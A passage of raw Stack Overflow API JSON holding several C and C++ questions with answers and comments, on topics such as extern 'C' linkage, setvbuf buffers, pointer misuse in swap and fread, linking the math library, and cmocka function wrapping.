</p>\n\n<p><strong>MyClass.cpp</strong></p>\n\n<pre><code>MyClass::MyClass(){};\nMyClass::~MyClass(){};\n\nextern \"C\" void* MyClassInit(){\n    return new MyClass();\n}\n</code></pre>\n\n<p><strong>MyClass.h</strong></p>\n\n<pre><code>extern \"C\" void* MyClassInit();\n</code></pre>\n\n<p>OK - the above compiles. But now I want to use <code>MyClassInit</code> in another <code>.c</code> file. As soon as I</p>\n\n<p><code>#include \"MyClass.h\"</code> in that file I get </p>\n\n<p><code>error: expected identifier or '(' before string constant</code> in <code>MyClass.h</code> where the externs are defined.</p>\n\n<p>I assume I am missing some \"if cplusplus\" or another extern or something else very obscure.</p>\n"}, {"tags": ["c", "file", "buffer", "stdio"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1518014212, "post_id": 48665500, "comment_id": 84330346, "body": "The book is talking nonsense when it says \u201ctwo buffers\u201d.  Only one buffer is used regardless."}], "answers": [{"tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": false, "score": 3, "last_activity_date": 1518014632, "creation_date": 1518014632, "answer_id": 48666560, "question_id": 48665500, "link": "https://stackoverflow.com/questions/48665500/c-file-input-output-buffers-and-setvbuf/48666560#48666560", "title": "C- File input/output buffers and setvbuf()", "body": "<blockquote>\n  <p>what buffer does the <code>setvbuf ()</code> function refer to?</p>\n</blockquote>\n\n<p>\"Both\" of them.  There's no requirement that the call to <code>fopen()</code> will create \"two buffers for read-write modes\".  Most implementations use a single buffer as that's all that's needed.</p>\n\n<p><a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">The C standard</a> implicitly supports a single buffer. Per <a href=\"http://port70.net/~nsz/c/c11/n1570.html#7.21.5.3p7\" rel=\"nofollow noreferrer\"><strong>7.21.5.3 The <code>fopen</code> function</strong>, paragraph 7</a>:  </p>\n\n<blockquote>\n  <p>When  a  file  is  opened  with  update  mode  (<code>'+'</code> as  the  second \n  or  third  character  in  the above  list  of mode argument  values), \n  both  input  and  output  may  be  performed  on  the associated \n  stream.   However,  output  shall  not  be  directly  followed  by \n  input  without  an intervening  call  to  the <code>fflush</code> function  or \n  to  a  file  positioning  function (<code>fseek</code>, <code>fsetpos</code>, or <code>rewind</code>), \n  and  input  shall  not  be  directly  followed  by  output  without \n  an intervening call to a file positioning function, unless the input\n  operation encounters end- of-file.  Opening (or creating) a text file\n  with update mode may instead open (or create) a binary stream in some\n  implementations.</p>\n</blockquote>\n\n<p>The requirements of that paragraph allow the use of a single buffer.</p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 4, "last_activity_date": 1518014757, "creation_date": 1518014757, "answer_id": 48666599, "question_id": 48665500, "link": "https://stackoverflow.com/questions/48665500/c-file-input-output-buffers-and-setvbuf/48666599#48666599", "title": "C- File input/output buffers and setvbuf()", "body": "<p>An open file only has a single buffer, regardless of whether it was opened for reading, writing, or both.</p>\n\n<p>Section 7.21.5.3 of the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">C standard</a>, which details the <code>fopen</code> function, states:</p>\n\n<blockquote>\n  <p><em>7</em> When a file is opened with update mode (<code>+</code> as the second or third character in the above list of mode argument values), both input\n  and output may be performed on the associated stream. <strong>However, output\n  shall not be directly followed by input without an intervening call to\n  the <code>fflush</code> function or to a file positioning function (<code>fseek</code>,\n  <code>fsetpo</code>s, or <code>rewind</code>), and input shall not be directly followed by\n  output without an intervening call to a file positioning function,\n  unless the input operation encounters end-of-file.</strong> Opening (or\n  creating) a text file with update mode may instead open (or create) a\n  binary stream in some implementations.</p>\n</blockquote>\n\n<p>The above paragraph states the output buffer must be flushed before performing input (either explicitly or implicitly via a positioning function), and the same when performing output after input.  This is a consequence of having only a single buffer.</p>\n\n<p>This also makes sense from a logical point of view as it prevents reads and writes from having an inconsistent view of the file contents.</p>\n"}], "owner": {"reputation": 457, "user_id": 8370202, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/25918f1d68b4bdb55f7afdd7673ef2e6?s=128&d=identicon&r=PG&f=1", "display_name": "AlexQualcosa", "link": "https://stackoverflow.com/users/8370202/alexqualcosa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 551, "favorite_count": 1, "accepted_answer_id": 48666599, "answer_count": 2, "score": 7, "last_activity_date": 1518085696, "creation_date": 1518011340, "last_edit_date": 1518085696, "question_id": 48665500, "link": "https://stackoverflow.com/questions/48665500/c-file-input-output-buffers-and-setvbuf", "title": "C- File input/output buffers and setvbuf()", "body": "<p>In C language, does fopen() really creates two buffers, one for input and the other for output? </p>\n\n<p>This is what my C book says:</p>\n\n<blockquote>\n  <p>Normally, the first step in using standard I/O is to use f open ( ) to\n  open a file. (Recall, however, that the stdin, stdout, and stderr\n  files are opened automatically.) The fopen( ) function not only opens\n  a file but sets up a buffer <strong>(two buffers for read-write modes)</strong>, and it\n  sets up a data structure containing data about the file and ..</p>\n</blockquote>\n\n<p>If opening a file with fopen () creates two buffers, in a writing mode like \"a+\", ie both reading and writing</p>\n\n<pre><code>FILE * fp = fopen (\"file.txt\", \"a +\");\nsetvbuf (destination_file, NULL, _IOFBF, BUFFER_SIZE);\n</code></pre>\n\n<p>what buffer does the setvbuf () function refer to?</p>\n"}, {"tags": ["c", "pointers", "segmentation-fault", "swap"], "comments": [{"owner": {"reputation": 10842, "user_id": 2164365, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/RKSgV.png?s=128&g=1", "display_name": "Abra", "link": "https://stackoverflow.com/users/2164365/abra"}, "edited": false, "score": 1, "creation_date": 1518009924, "post_id": 48664959, "comment_id": 84327318, "body": "Call to <code>swap()</code> - in <code>main()</code> - is incorrect. It should be <code>swap(&amp;x, &amp;y)</code>"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1518009924, "post_id": 48664959, "comment_id": 84327319, "body": "You should get a compiler warning on this line: <code>swap(x,y);</code>. Compile with <code>-Wall</code>. And BTW what would <code>swap(3,4);</code> do? And also put some effort in formatting your code."}, {"owner": {"reputation": 787, "user_id": 7714006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2bf23fe02b176b9ec4b72f65570e0b5?s=128&d=identicon&r=PG&f=1", "display_name": "Aditi Rawat", "link": "https://stackoverflow.com/users/7714006/aditi-rawat"}, "edited": false, "score": 0, "creation_date": 1518009935, "post_id": 48664959, "comment_id": 84327325, "body": "You are passing the value of variables <code>x</code> and <code>y</code> , <i>not</i>  their addresses."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1518010061, "post_id": 48664959, "comment_id": 84327413, "body": "Please <b><i>properly</i></b> indent your code. Machine (Compiler) can read and compile anything, but for humans, it needs to make a little <i>sense</i> while reading a block of text as <i>code</i>. When asking question, there was a big orange <b>How to Format</b> box to the right of the text area. There was also an entire toolbar of formatting aids. And a <b>[?]</b> button giving formatting help. And a preview area  showing what your post would look like when posted. Making your post clear, and demonstrating that you took the time to do so, improves your chances of getting good answers."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1518010074, "post_id": 48664959, "comment_id": 84327420, "body": "Kindly show your research / debugging effort so far. Please read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> page first."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1518010704, "post_id": 48664959, "comment_id": 84327862, "body": "The problem is that you are using a trash compiler. This code is not allowed to compile without a warning/error from the compiler."}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518016656, "post_id": 48664959, "comment_id": 84332119, "body": "As others have mentioned, you should have seen compiler warnings. If not, turn them on and do not ignore them. Warnings are often errors waiting to happen."}], "answers": [{"tags": [], "owner": {"reputation": 2445, "user_id": 4390699, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/4fe7d756a92a20b8b49b05cc0f1bb628?s=128&d=identicon&r=PG", "display_name": "Raman", "link": "https://stackoverflow.com/users/4390699/raman"}, "is_accepted": true, "score": 4, "last_activity_date": 1518012203, "last_edit_date": 1518012203, "creation_date": 1518009996, "answer_id": 48665020, "question_id": 48664959, "link": "https://stackoverflow.com/questions/48664959/c-pointers-what-is-the-solution-of-segment-fault/48665020#48665020", "title": "C pointers-What is the solution of Segment fault", "body": "<p>The problem is in line <code>swap(x, y);</code></p>\n\n<p>You are passing the values and not the addresses. You should have got compiler warnings.</p>\n\n<p>Use <code>swap(&amp;x, &amp;y);</code></p>\n"}], "owner": {"reputation": 13, "user_id": 6816507, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4YgTS.jpg?s=128&g=1", "display_name": "Ahmed Osama", "link": "https://stackoverflow.com/users/6816507/ahmed-osama"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 111, "favorite_count": 0, "closed_date": 1518014813, "accepted_answer_id": 48665020, "answer_count": 1, "score": -5, "last_activity_date": 1518012203, "creation_date": 1518009808, "last_edit_date": 1518011425, "question_id": 48664959, "link": "https://stackoverflow.com/questions/48664959/c-pointers-what-is-the-solution-of-segment-fault", "closed_reason": "Not suitable for this site", "title": "C pointers-What is the solution of Segment fault", "body": "<p>Why does it output \"Segmentation fault(core dumped)</p>\n\n<p>When I run the following code it says Segment fault(core dumped)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid swap(int *, int *);\n\nint main() {\n    int x = 5, y = 10;\n    swap(x, y);\n    printf(\"%i\\n %i\\n\", x, y);\n}\n\nvoid swap(int *a, int *b) {\n    int s;\n    s = *a;\n    *a = *b;\n    *b = s;\n}\n</code></pre>\n"}, {"tags": ["c", "bison", "yacc", "pow"], "comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 1, "creation_date": 1518009714, "post_id": 48664879, "comment_id": 84327161, "body": "You need <code>-lm</code> in your compile options if you use the math library. Nothing to do with parsing."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1518009733, "post_id": 48664879, "comment_id": 84327172, "body": "Many of the <a href=\"http://en.cppreference.com/w/c/numeric/math\" rel=\"nofollow noreferrer\">common mathematical functions</a> are in a separate library that needs to be explicitly linked. That library is simply called <code>m</code>. I&#39;m sure someone will come with a duplicate soon enough which is why I won&#39;t answer."}], "answers": [{"tags": [], "owner": {"reputation": 560, "user_id": 1974137, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/50a1a180963d83ad9c5af5b2dbeb9d55?s=128&d=identicon&r=PG", "display_name": "ashwinbhy", "link": "https://stackoverflow.com/users/1974137/ashwinbhy"}, "is_accepted": true, "score": 3, "last_activity_date": 1518009795, "creation_date": 1518009795, "answer_id": 48664953, "question_id": 48664879, "link": "https://stackoverflow.com/questions/48664879/undefined-reference-to-pow-in-yyparse/48664953#48664953", "title": "undefined reference to `pow&#39; in yyparse", "body": "<p>Try adding -lm when compiling the files.\nexample:\ngcc c.tab.c lex.yy.cc -lm</p>\n"}], "owner": {"reputation": 167, "user_id": 3952707, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Nv7KW.jpg?s=128&g=1", "display_name": "ashish malgawa", "link": "https://stackoverflow.com/users/3952707/ashish-malgawa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 646, "favorite_count": 0, "closed_date": 1518009827, "accepted_answer_id": 48664953, "answer_count": 1, "score": 2, "last_activity_date": 1518009795, "creation_date": 1518009544, "last_edit_date": 1518009644, "question_id": 48664879, "link": "https://stackoverflow.com/questions/48664879/undefined-reference-to-pow-in-yyparse", "closed_reason": "Duplicate", "title": "undefined reference to `pow&#39; in yyparse", "body": "<p>I have include math.h in my .yacc file and when I am trying to use the pow function in this part of the code it is giving me the above mentioned error</p>\n\n<pre><code>expression2:expression2 POWER_OP expression3  {/*keeping POWER_OP at highest precedence*/ $$ = pow($1,$3);}\n</code></pre>\n\n<p>and when I tried to put 2,3 or any constant value in the same part of code it is working fine</p>\n"}, {"tags": ["c", "unit-testing", "linker", "cunit", "cmocka"], "answers": [{"tags": [], "owner": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "is_accepted": false, "score": 1, "last_activity_date": 1518084787, "creation_date": 1518084787, "answer_id": 48682890, "question_id": 48664718, "link": "https://stackoverflow.com/questions/48664718/wrapping-function-in-c/48682890#48682890", "title": "Wrapping function in c", "body": "<blockquote>\n  <p>is it possible to wrap function call to function that is defined and called in one file?</p>\n</blockquote>\n\n<p><code>cmocka</code> leverages the linker's <code>--wrap</code> option, as you know. The <a href=\"https://sourceware.org/binutils/docs/ld/Options.html\" rel=\"nofollow noreferrer\">documentation of <code>--wrap=symbol</code></a> tells us that the answer to\nyour question is No:</p>\n\n<blockquote>\n  <p>--wrap=symbol</p>\n  \n  <p>Use a wrapper function for symbol. Any undefined reference to symbol will be\n  resolved to __wrap_symbol. Any undefined reference to __real_symbol will be\n  resolved to symbol.</p>\n</blockquote>\n\n<p>Any reference to <code>symbol</code> that is in an object file that also contains the\ndefinition of <code>symbol</code> is not an undefined reference, so the linker will <em>not</em>\nresolve that reference to <code>__wrap_symbol</code>. The definition must be compiled into\nsome other object file in the linkage for wrapping of the reference to occur.</p>\n"}], "owner": {"reputation": 162, "user_id": 4746861, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b02d093c0e7e10074b7d572396022657?s=128&d=identicon&r=PG&f=1", "display_name": "mmichal10", "link": "https://stackoverflow.com/users/4746861/mmichal10"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 270, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1518084787, "creation_date": 1518009022, "question_id": 48664718, "link": "https://stackoverflow.com/questions/48664718/wrapping-function-in-c", "title": "Wrapping function in c", "body": "<p>I got task to write unit tests(using cunit and cmocka) for existing project(written in C), and a met following problem. When I wrap function that is defined in tested file, only original function is called. Additional, a can't change source of tested file.\nEverything I read didn't met the second condition, but on the other hard it is pretty hard to believe that unit test framework is not prepared for this kind of problem.</p>\n\n<p>So is it possible to wrap function call to function that is defined and called in one file?</p>\n\n<p>I've tried to wrap it by adding appropriate linker flag to cmake file.</p>\n"}, {"tags": ["c", "fread"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2201041"}, "edited": false, "score": 3, "creation_date": 1518007652, "post_id": 48664202, "comment_id": 84325563, "body": "<code>the fread() does not works very well </code> Can you be more specific here?"}, {"owner": {"reputation": 1, "user_id": 9327519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8eb739ec418456b20814003f948a8b3b?s=128&d=identicon&r=PG&f=1", "display_name": "Yunhan Tu", "link": "https://stackoverflow.com/users/9327519/yunhan-tu"}, "edited": false, "score": 0, "creation_date": 1518007770, "post_id": 48664202, "comment_id": 84325629, "body": "i am using xcode first of all there is a Thread 1: EXC_BAD_ACCESS second the p1 and p2 got nothing from using fread()"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 4, "creation_date": 1518007812, "post_id": 48664202, "comment_id": 84325662, "body": "<code>&amp;p1</code> in <code>fread(&amp;p1, 1, size, f1);</code> is incorrect. You are giving address of a pointer, not address stored in pointer. It should be plain <code>p1</code> instead."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1518008569, "post_id": 48664202, "comment_id": 84326245, "body": "Unrelated to your problem: if only one of the files cannot be opened, your code fails to close the FILE pointer of the other one. And possibly you don&#39;t check if the program has been invoked with two arguments."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 3, "creation_date": 1518009019, "post_id": 48664202, "comment_id": 84326630, "body": "<code>f1 = fopen(*++argv,&quot;rb&quot;);</code> is overly confusing. <code>f1 = fopen(argv[1],&quot;rb&quot;); f2 = fopen(argv[2],&quot;rb&quot;);</code> is a lot easier to understand.  Confusing code leads to bugs you can&#39;t find.  And <code>if(f1 == NULL || f2 == NULL) ...</code> doesn&#39;t tell you which file failed to open - also making problems harder to find."}], "answers": [{"tags": [], "owner": {"reputation": 679, "user_id": 5155574, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FX9BZpOiVdk/AAAAAAAAAAI/AAAAAAAAAI0/cHgtmpGWfgM/photo.jpg?sz=128", "display_name": "Josh Abraham", "link": "https://stackoverflow.com/users/5155574/josh-abraham"}, "is_accepted": false, "score": 0, "last_activity_date": 1518008235, "creation_date": 1518008235, "answer_id": 48664421, "question_id": 48664202, "link": "https://stackoverflow.com/questions/48664202/read-the-entire-file-into-this-area-allocated-on-the-heap/48664421#48664421", "title": "Read the entire file into this area allocated on the heap", "body": "<p>fread takes a void *ptr, not a void **ptr:</p>\n\n<pre><code>if(a != 3)\n    return;\nFILE *f1;\nFILE *f2;\nf1 = fopen(*++argv,\"rb\");\nf2 = fopen(*++argv,\"rb\");\nif(f1 == NULL || f2 == NULL) {\n    printf(\"Can not open file \\n\");\n    return;\n}\nunsigned char *p1 = (unsigned char*)malloc(size + 1);\nunsigned char *p2 = (unsigned char*)malloc(size + 1);\n\n\n\nfread(p1, 1, size, f1);\nfread(p2, 1, size, f2);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 9327519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8eb739ec418456b20814003f948a8b3b?s=128&d=identicon&r=PG&f=1", "display_name": "Yunhan Tu", "link": "https://stackoverflow.com/users/9327519/yunhan-tu"}, "edited": false, "score": 0, "creation_date": 1518009652, "post_id": 48664422, "comment_id": 84327114, "body": "one more question since i store the bmp file in the p1 p2 how can i get the width and height for the bmp file"}, {"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "reply_to_user": {"reputation": 1, "user_id": 9327519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8eb739ec418456b20814003f948a8b3b?s=128&d=identicon&r=PG&f=1", "display_name": "Yunhan Tu", "link": "https://stackoverflow.com/users/9327519/yunhan-tu"}, "edited": false, "score": 1, "creation_date": 1518009812, "post_id": 48664422, "comment_id": 84327233, "body": "@YunhanTu you can ask this as a formal question by pressing <a href=\"https://stackoverflow.com/questions/ask\">stackoverflow.com/questions/ask</a>, as this is unrelated to your original post."}], "tags": [], "owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "is_accepted": false, "score": 1, "last_activity_date": 1518008574, "last_edit_date": 1518008574, "creation_date": 1518008236, "answer_id": 48664422, "question_id": 48664202, "link": "https://stackoverflow.com/questions/48664202/read-the-entire-file-into-this-area-allocated-on-the-heap/48664422#48664422", "title": "Read the entire file into this area allocated on the heap", "body": "<p>Look at the signature of the function <code>fread()</code>:</p>\n\n<pre><code>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);\n</code></pre>\n\n<p>As you can see, its first parameter is a pointer. In your code, you define <code>p1</code> and <code>p2</code> as pointers to <code>unsigned char</code>, but you passed their addresses to <code>fread()</code>. This is wrong; you should pass them by value, like the following:</p>\n\n<pre><code>fread(p1, 1, size, f1);\nfread(p2, 1, size, f2);\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 9327519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8eb739ec418456b20814003f948a8b3b?s=128&d=identicon&r=PG&f=1", "display_name": "Yunhan Tu", "link": "https://stackoverflow.com/users/9327519/yunhan-tu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 582, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1518008651, "creation_date": 1518007563, "last_edit_date": 1518008651, "question_id": 48664202, "link": "https://stackoverflow.com/questions/48664202/read-the-entire-file-into-this-area-allocated-on-the-heap", "title": "Read the entire file into this area allocated on the heap", "body": "<p>I am trying to open and read two bmp files through command line arguments. After I malloc the size for the  char * I get lost, the <code>fread()</code> does not work very well. What's wrong with my code </p>\n\n<p>Here is what I have:</p>\n\n<pre><code>void processFileDate(int a, char  **argv, unsigned long size) {\n\n    if(a != 3)\n        return;\n    FILE *f1;\n    FILE *f2;\n    f1 = fopen(*++argv,\"rb\");\n    f2 = fopen(*++argv,\"rb\");\n    if(f1 == NULL || f2 == NULL) {\n        printf(\"Can not open file \\n\");\n        return;\n    }\n    unsigned char *p1 = (unsigned char*)malloc(size + 1);\n    unsigned char *p2 = (unsigned char*)malloc(size + 1);\n\n    fread(&amp;p1, 1, size, f1);\n    fread(&amp;p2, 1, size, f2);\n</code></pre>\n"}, {"tags": ["c++", "c", "error-handling", "macros", "runtime-error"], "comments": [{"owner": {"reputation": 15050, "user_id": 8605791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ae3be140b26db13a86d624dba4ef1c8?s=128&d=identicon&r=PG&f=1", "display_name": "llllllllll", "link": "https://stackoverflow.com/users/8605791/llllllllll"}, "edited": false, "score": 1, "creation_date": 1518007387, "post_id": 48664121, "comment_id": 84325376, "body": "Don&#39;t add both c++ and c tags, they are quite different."}, {"owner": {"reputation": 1636, "user_id": 3370124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f73352b4adb282c092738f34883488dd?s=128&d=identicon&r=PG&f=1", "display_name": "Richard Critten", "link": "https://stackoverflow.com/users/3370124/richard-critten"}, "edited": false, "score": 0, "creation_date": 1518007669, "post_id": 48664121, "comment_id": 84325568, "body": "Voting to close as &quot;Opinion Based&quot;. As you illustrate in the question there are many ways to achieve this none objectively better than the other."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2201041"}, "edited": false, "score": 3, "creation_date": 1518007773, "post_id": 48664121, "comment_id": 84325634, "body": "Maybe more appropriate for <a href=\"https://softwareengineering.stackexchange.com\">Software Engineering</a>?"}, {"owner": {"reputation": 8811, "user_id": 487892, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Leb5B.jpg?s=128&g=1", "display_name": "drescherjm", "link": "https://stackoverflow.com/users/487892/drescherjm"}, "edited": false, "score": 0, "creation_date": 1518008136, "post_id": 48664121, "comment_id": 84325923, "body": "I use a logger like boost:log in nearly all of my applications."}, {"owner": {"reputation": 9704, "user_id": 893254, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/e4417c43fd253cd5b52e2dd709e34b44?s=128&d=identicon&r=PG&f=1", "display_name": "FreelanceConsultant", "link": "https://stackoverflow.com/users/893254/freelanceconsultant"}, "reply_to_user": {"reputation": 1636, "user_id": 3370124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f73352b4adb282c092738f34883488dd?s=128&d=identicon&r=PG&f=1", "display_name": "Richard Critten", "link": "https://stackoverflow.com/users/3370124/richard-critten"}, "edited": false, "score": 0, "creation_date": 1518008206, "post_id": 48664121, "comment_id": 84325976, "body": "@RichardCritten That&#39;s not true. The example I gave is pretty much objectively worse in all possible metrics except for simplicity."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518009632, "post_id": 48664121, "comment_id": 84327096, "body": "<i>This style of outputting messages to <code>cerr</code> is not easy to change in future ...</i>  True, While you can redirect the output to a file, that has huge disadvantages, too.  Your process becomes tied to the log file. You can&#39;t rotate such a log file, you can&#39;t reliably truncate such a log file if it fills up your disk, nor can you delete the log file (on Posix-type systems, even if you do <i>unlink</i> its directory entry, it&#39;ll remain on disk, growing...)"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518011236, "post_id": 48664121, "comment_id": 84328243, "body": "This is too broad and leads to opinion-based answers. As for your concern, you should simply be writing to an <code>ostream</code> object and then set that to <code>cerr</code> or whatever else is suitable, elsewhere. If you need more detailed error handling, implement an error handler class. Icky macros is not a good idea neither in C nor C++."}, {"owner": {"reputation": 6198, "user_id": 839601, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d6db99aa846a8217f7e2aba6fa198e7c?s=128&d=identicon&r=PG", "display_name": "gnat", "link": "https://stackoverflow.com/users/839601/gnat"}, "edited": false, "score": 0, "creation_date": 1518011548, "post_id": 48664121, "comment_id": 84328486, "body": "@JETM when referring other sites, it is often helpful to point that <a href=\"https://meta.stackexchange.com/tags/cross-posting/info\">cross-posting is frowned upon</a>"}, {"owner": {"reputation": 9704, "user_id": 893254, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/e4417c43fd253cd5b52e2dd709e34b44?s=128&d=identicon&r=PG&f=1", "display_name": "FreelanceConsultant", "link": "https://stackoverflow.com/users/893254/freelanceconsultant"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518031462, "post_id": 48664121, "comment_id": 84341504, "body": "@Lundin I don&#39;t see how there is any opinion in &quot;best practices&quot;. The vast majority of people will agree on whether a common or standard method is suitable. Anyone who disagrees in this hypothetical situation is probably just wrong."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518074942, "post_id": 48664121, "comment_id": 84356843, "body": "@user3728501 There is no common de facto standard, why it is opinion-based. Asking for all the possible ways to do this, in two different programming languages, is too broad."}, {"owner": {"reputation": 9704, "user_id": 893254, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/e4417c43fd253cd5b52e2dd709e34b44?s=128&d=identicon&r=PG&f=1", "display_name": 